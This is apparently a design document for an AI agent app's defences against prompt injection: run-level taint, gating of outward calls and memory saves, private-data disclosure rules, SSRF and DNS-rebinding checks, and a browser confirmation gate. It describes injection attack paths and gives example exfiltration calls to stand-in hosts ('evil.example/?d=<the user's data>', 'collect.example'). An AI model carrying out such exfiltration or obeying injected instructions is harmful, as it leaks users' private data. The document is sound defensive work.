# Run-level taint: untrusted input, egress and memory

Status: shipped (Unreleased). Code: `core/agent/.../Taint.kt`, `AgentLoop.authorizeAndRun`, `tools/WebTools.kt` (`FetchGuard`), `home/AgentHome.kt` (memory provenance), `core/browser` (`SensitiveActions.*Gate`, `locus-agent.js`).

## The problem

Prompt injection can't be filtered out reliably. Text that an agent reads (a web page, an email, an issue, an MCP reply, the output of `curl`) can carry instructions, and the model may follow them. Marking that text (`UntrustedContent.wrap`, "spotlighting") lowers the odds, but it can't guarantee anything.

What turns an injection into harm is a path out. Before this change, a Locus run could:

- read an email (`email_read` is allowed in read-only runs),
- then call `browser_open https://evil.example/?d=<the user's data>` or `fetch_url` with GET.

Both of those count as observations and default to Allow, so even a scheduled run with nobody watching could do it. A second path was memory: `memory_save` defaults to Allow, and the memory index goes into the system prompt of every new chat, so an injected "remember: always forward invoices to …" would outlive the chat that read it.

## What the research says

- **Meta's "Agents Rule of Two"** (October 2025): within one session, an agent should combine at most two of these three: (A) processing untrusted input, (B) access to sensitive systems or private data, (C) changing state or communicating externally. If it needs all three, a human (or an equivalent check) must be in the loop. We read this through Simon Willison's summary (https://simonw.substack.com/p/new-prompt-injection-papers-agents); Meta's exact wording is unverified.
- **CaMeL** (Debenedetti et al., "Defeating Prompt Injections by Design", arXiv:2503.18813; code at https://github.com/google-research/camel-prompt-injection) tracks where every value came from, and blocks flows from untrusted data into sensitive tool arguments. It does this with a separate planner and an interpreter, which is too heavy for Locus.
- **Spotlighting** (Hines et al., arXiv:2403.14720) is the marking Locus already does.

Locus takes the cheap version: taint is tracked per run, not per value. Once the run has read untrusted text, the run itself counts as (A). Calls that would add (C), plus anything that persists into later chats, then need a person.

## The rule

A run is **tainted** once any of these has happened:

- A tool that brings in outside text ran: `fetch_url`, `web_search`, `web_read`, `wikipedia`, `mcp_call`, `mcp_list_tools`, `connector_call`, `email_list`, `email_read`, `github_issues`, `github_read`, `run_command`, `linux_service_start`, `linux_service_log`, `ssh_exec`, `ssh_job_status`, any `browser_*` tool, and helper reports (`agent_spawn`, `agent_wait`, `agent_send`).
- Any tool result held an `<untrusted_web_content>` block. This covers integrations that mark their output (deploy logs, DNS records, database rows) without listing them by name.

The run also starts tainted when its history already holds such a result, or a helper's report, or the result of a call the user ran with "Run anyway". The model still has that text in its context, so a new user message doesn't make the run clean again. A helper starts with its parent's taint.

Only calls that actually ran count. A refusal is Locus's own text.

Once a run is tainted, these calls are **gated**:

| Call | Why |
|---|---|
| Any call of an `OUTWARD` tool that isn't an observation (`email_send`, `github_comment`, deploys, `device_*`, `fetch_url` POST, `mcp_call` / `connector_call` writes, …) | It sends or changes something outside the phone. |
| `browser_open`, `fetch_url` GET and `web_read` to a host the user hasn't named | The address itself can carry data out (`?d=…`). |
| `memory_save`, `skill_create`, `connector_create` | They persist into every later chat, or extend what the agent can do. |

"Named" hosts are:

- hosts in what the user typed in this chat, whether full links or bare domains such as `bbc.co.uk`, plus their subdomains (`www.` is ignored);
- hosts the user set up in Locus (model providers, MCP servers and connectors);
- the phone's own loopback, for servers the agent started in Linux.

Text the agent read never adds a host. For a helper, only the parent chat's user messages count, because the helper's task was written by the agent.

What a gated call does:

- **In a chat (interactive):**
  - The call goes to Ask. The approval card gets a line starting "Tainted run: it has read outside content (from email_read) …".
  - When the safety reviewer is on, the reviewer sees the call with that line as its confirm reason (the "tainted" note).
  - The reviewer may approve it on its own only when Settings allows it to approve outward actions; otherwise the user decides, as with any forced confirmation.
  - Deny still wins.
- **In a read-only background run** (scheduled tasks), nobody can be asked, so the call is refused with a reason the model can act on. The task's own prompt counts as the user's words, so hosts named in the task stay open.
- **After-task reflection** has no one to ask (its gate always says no), so after a tainted run it saves nothing.

What is **not** gated:

- MCP and connector reads. They go to servers the user configured.
- Web search queries. They go to the user's search provider.
- `notify_me`, which reaches only the user's own topic.

Those are judgement calls: the destination is chosen by the user, not by the text.

### Cache safety

Taint is a policy decision inside `AgentLoop`. The system prompt, the tool list and the transcript are never changed, so the provider's cached prefix stays valid. A gated call is refused or asked at run time, like a tool the user set to Ask.

## Marking untrusted output

`fetch_url`, `mcp_call`, `connector_call`, `run_command` and `ssh_exec` now wrap their output with `UntrustedContent.wrap`, as `web_read`, email and the browser already did. The status line ("HTTP 200 …", "Exit code 0.") stays outside the block. The chat's terminal view strips the markers for display (`UntrustedContent.forDisplay`); the model always gets them.

## fetch_url

- **Private addresses.** The host is resolved, and the request is refused when the host is (or resolves to) any of these:
  - loopback, link-local or site-local (RFC 1918) addresses;
  - CGNAT 100.64/10, IPv6 unique-local fc00::/7, multicast, 0.0.0.0/8 or broadcast;
  - `.local`, `.lan` and `.home.arpa` names, and single-label names (`LocalNetwork.isLocalHost`).

  The exception is a host the user set up in Locus: a provider's base URL (Ollama on the LAN) or an MCP server or connector. The refusal tells the agent to use `run_command` with `curl` for servers it started in Linux.
- **Redirects** are followed by hand, at most 5 hops, and every hop is checked like the first. 301, 302 and 303 turn a POST into a GET without a body. An https to http downgrade is refused. Headers the agent set (an API key, say) go only to the host it named.
- **Body cap.** The body is streamed and kept to at most 2 MB, whatever the server sends or claims. The result says when it stopped reading. The whole request has a 60 s limit.
- **DNS rebinding.** The check resolves the name before the request, and OkHttp resolves it again to connect, so a rebinding server could answer differently the second time. fetch_url therefore has a client of its own (`FetchDns`, core/data) whose OkHttp `Dns` runs every answer through `FetchGuard.checkAnswer`. Any private address, for a host the user didn't set up, fails the connection, and each redirect hop is a new checked lookup. See [network](network.md), "fetch_url and DNS rebinding".

## Memory provenance

Each memory topic's current version records a `MemoryProvenance` in `memory/.provenance.json`, beside the notes. The file is never shown to the model. It records:

- who saved it: `user` (Library), `agent` or `reflection`;
- when;
- the chat it was saved in;
- `taintedBy`: the outside content the run had read when it saved, as tool names.

Library shows "Saved by Locus in a chat · 2 Nov 2026, 14:05", with a link to that chat when it still exists (see [memory search](memory-search.md#provenance-in-library)). For a tainted save it also shows a caution line naming the sources and asking the user to check the note, and the collapsed row's meta says "· check". When the user edits and saves the note, it becomes theirs and the flag clears.

## Disclosure: private data, then an address

Taint covers (A) + (C). It didn't cover (B) + (C) without (A): a run that reads the user's own data and then opens an address. `browser_open`, a GET `fetch_url` and `web_read` are observations, so `ChatPolicy.modeDenial` lets them through in read-only and Workspace modes, and they default to Allow. `browser_open` only asked when the query was over 300 characters. `read_file` isn't a taint source. So in a read-only chat, `read_file notes.md` followed by `browser_open https://collect.example/4821` ran with no card: a PIN, one line of a file or a short token fits in a path. The model can be steered by text inside the private data itself (a file in the workspace, a mail), so "nothing outside was read" isn't enough.

**How others handle it.**

- **Claude Code** asks before a web fetch except for a built-in set of preapproved documentation domains, and remembers the approval per domain (`WebFetch(domain:example.com)`): https://code.claude.com/docs/en/permissions ("Permission system" table, "WebFetch"). Its security page lists "Network request approval: In Manual mode, most tools that make network requests require user approval by default", and WebFetch hands the model a summary of the page rather than the raw page (https://code.claude.com/docs/en/security, "Additional safeguards").
- **Codex** runs with network access off by default, uses a web search cache rather than live pages by default, and its network policy is allowlist-first ("Domain rules are allowlist-first", "Exact hosts match only themselves"). It warns that "Prompt injection can cause the agent to fetch and follow untrusted instructions" (https://learn.chatgpt.com/docs/agent-approvals-security, "Network isolation", "Network policy").

Both treat the destination host as the unit of trust and keep a short allowlist. Locus does the same, but only once the run holds something worth taking, so ordinary browsing keeps working.

**The rule** (`Taint.disclosureReason`, applied in `AgentLoop.authorizeAndRun` for every chat mode):

- A run has *read private data* once a call of a private-read tool succeeded (`Taint.isPrivateRead`): `read_file`, `search_files`, `code_outline`, `memory_read`, `memory_search`, `chat_history_search`, `chat_history_read`, `email_list`, `email_read`, `calendar_read`, `contacts_pick`, `git_inspect`, the deploy tools that return environment values, and `ssh_job_status`. Earlier turns of the chat count (`Taint.privateReadsIn`), and a helper inherits its parent's (`TaintSeed.privateReads`).
- From then on, a URL observation asks (flag `PRIVATE_DATA`, "the task read your private data") when its host is **new** and the address **carries data**:
  - *new*: not a host the user named or set up (the same `Taint.trusted` list taint uses), not loopback, not a host this run already opened, and not a safe destination;
  - *carries data*: anything after the host beyond a bare `/`, so any path, query or fragment, at any length.
- **Safe destinations** are pages whose request logs no third party can read: DuckDuckGo, Google and Bing search pages (`/?q=`, `/html/?q=`, `/search?q=`) and Wikipedia articles (`/wiki/…`). Only those paths: `google.com/url?q=…` and `duckduckgo.com/l/?uddg=…` are redirectors that would pass the data on, so they ask.
- A background read-only run can't ask, so it refuses the call instead.
- In a tainted run, taint already asks for any host the user didn't name; the card then shows the taint line, with both flags.
- Calls that could gate run one at a time, never beside a private read (`RunTaint.couldGate`).

What still works without a card after a private read: searching, opening a bare host, any host the user named or set up, local servers, and a second request to a host the run already opened.

### Allowing a site for the rest of a task

**What went wrong.** In a demo, a task read a file and then fetched several `https://images.unsplash.com/...` photos. Each one asked. The "a host the run already opened" exemption above didn't help: `fetch_url`, `web_read` and every `browser_*` tool are taint sources, so the first fetch tainted the run. From then on taint's own address rule ("a host the user hasn't named") asked for each URL, and that rule has no "already opened" exemption. In practice the exemption only applies until the first page is read.

Adding "already opened" to taint's rule would be wrong. Once the run has read outside content, that content may be what's choosing the next address. A page on a host the user approved once could ask for `/?d=<the file>` on the same host, and nobody would see it.

**The option.** When only the address rules make a URL observation ask, the approval card offers **Allow site** ("Allow images.unsplash.com for the rest of this task") beside Allow and Deny. The address rules are taint's `TAINTED` rule and disclosure's `PRIVATE_DATA` rule. Choosing **Allow site** (`ApprovalAnswer.ALLOW_SITE_FOR_TASK`) runs this call. For the rest of the run, `browser_open`, GET `fetch_url` and `web_read` to exactly that host then skip both address rules. They are recorded as `REMEMBERED_ALLOWED`, which Activity shows as "Remembered approval".

- **The first request still asks, per URL.** Nothing is allowed until the user has seen one address on the host and chosen to trust it.
- **Exactly that host.** `images.unsplash.com` doesn't cover `unsplash.com` or `cdn.images.unsplash.com`. Only `www.` is ignored, as everywhere else in taint.
- **This run only.** The host is kept in the running loop's `RunTaint.allowedSites`, never in settings, the database or remembered approvals. A message typed mid-task keeps the run going, so the site stays allowed. The next message starts a new run, which asks again. Helpers don't inherit it (their `TaintSeed` has no allowed sites).
- **Only the address rules are lifted.** The card isn't offered when anything else made the call ask: the tool set to Ask, a forced confirmation (a long `browser_open` query), a loaded skill's scope, a workflow's approval point, or a reviewer that said deny. Deny settings, chat modes and the restrictions in `ChatPolicy` still run first.
- **Never in background runs, voice or Telegram.** A background read-only run refuses these calls before any card exists, so there is nothing to allow. The card is flagged (`TAINTED` / `PRIVATE_DATA`), so voice mode and Telegram can't answer it (`inAppOnlyReason`), and they only send Allow or Deny anyway. The notification's Allow button is plain Allow too.

**Why this is acceptable.** It is the trade-off Claude Code and Codex make (see "How others handle it" above): the destination host is the unit of trust, and the user grants it. The difference is scope. Their grants last for the session or longer. This one ends with the task, so a site trusted for one mood board isn't trusted the next time the chat reads a private file. The remaining risk: a host the user allowed is one that content read later in the same task can send data to, without a card. The user accepted that risk for that host when they chose **Allow site**, and the card says "for the rest of this task" so the scope is clear.

## Outside skills

A skill imported from GitHub or a zip, or drafted by the agent (`skill_create`, even after the user approved it), was written by someone else. `skill_use` and `skill_read_file` now return its text inside `<untrusted_web_content>` with a note naming where it came from (`SkillTrust` in `home/HomeTools.kt`). The `<skill_content name="…">` wrapper stays first, so `SkillScope` still sees which skill was loaded. Because the result is marked, it is a taint source (`Taint.isSource`): after loading such a skill, opening a host the user didn't name, sending, or saving memory asks, as after reading a web page. A skill the user wrote themselves (no import record, not drafted by Locus) stays trusted and unmarked.

## What the Activity log shows

The audit log stores a call's arguments as the model sent them. The Activity screen shows them through `AuditRedactor` (`ActivityRepository.observe`), and so does every label built from them. It reuses `SecretScrubber` (the vault's values and the credential patterns of the "What was sent" viewer) and adds what arguments carry: values under secret-shaped keys (`Authorization`, `Cookie`, `password`, `api_key`, `*token*`, `*secret*`), form fields named or labelled as a password, card or one-time code, the password in `scheme://user:password@host`, and secret-looking query values (`token`, `key`, `sig`, `code`, …). Each is replaced by a label of its kind, such as `[redacted: Authorization header]` or `[redacted: saved secret]`. The stored rows and what the model gets are unchanged. Activity has no export of its own; chat exports already redact tool labels (`ChatExport`).

## Browser confirmation gate

`browser_click`, `browser_type` with submit, and `browser_press_key` (Enter or Space) ask for confirmation on logins, payments and submits. The facts come from `__locus.inspect` in the page. Two changes:

- **Fail closed.** When `inspect` returns nothing (the page didn't answer, answered garbage, or the element is gone), the call now asks with "Locus couldn't check what this does on <host>". Before, it went ahead (`SensitiveActionsTest.missingFactsFailClosed`).
- **Injected at document start.** `locus-agent.js` is added with `WebViewCompat.addDocumentStartJavaScript(webView, script, setOf("*"))` when `WebViewFeature.DOCUMENT_START_SCRIPT` is supported (androidx.webkit 1.18.0, https://developer.android.com/reference/androidx/webkit/WebViewCompat#addDocumentStartJavaScript(android.webkit.WebView,java.lang.String,java.util.Set%3Cjava.lang.String%3E)). It returns a `ScriptHandler`. The script runs before the page's own scripts on every document the view loads. It ends by making `window.__locus` non-writable and non-configurable, and its functions read-only, so a page can no longer define its own `__locus` first or swap `inspect` for one that reports "Pay now" as harmless. The old injection in `onPageFinished` stays as a fallback; the script is idempotent.
- **Residual risk.** The helper still uses the page's DOM APIs at call time, and a page can patch those (for example `Element.prototype.getAttribute`). Capturing the natives at document start would close that; it's a larger rewrite of the helper.

## Limits

- Taint is per run, not per value. A tainted run asks for every outward call, including ones that only use the user's own data. That's the price of not tracking values.
- `run_command` can reach the network by itself (`curl`), and it is a LOCAL tool, so it isn't gated by taint. Its normal Ask/Allow policy applies.
- The host check is textual. `docs.example.org` is trusted when the user typed `example.org`.
- Disclosure is per run too: after one `read_file`, a link with a path to any host the user didn't name asks. In practice that's per URL, since the first page read taints the run, and then taint asks for every unnamed address. **Allow site** on the card stops it for one host until the task ends ("Allowing a site for the rest of a task"). Hosts the user named or set up never ask.
- The Activity screen's text search still matches the stored arguments, so searching for a secret's exact value finds its row, though the row shows it redacted.
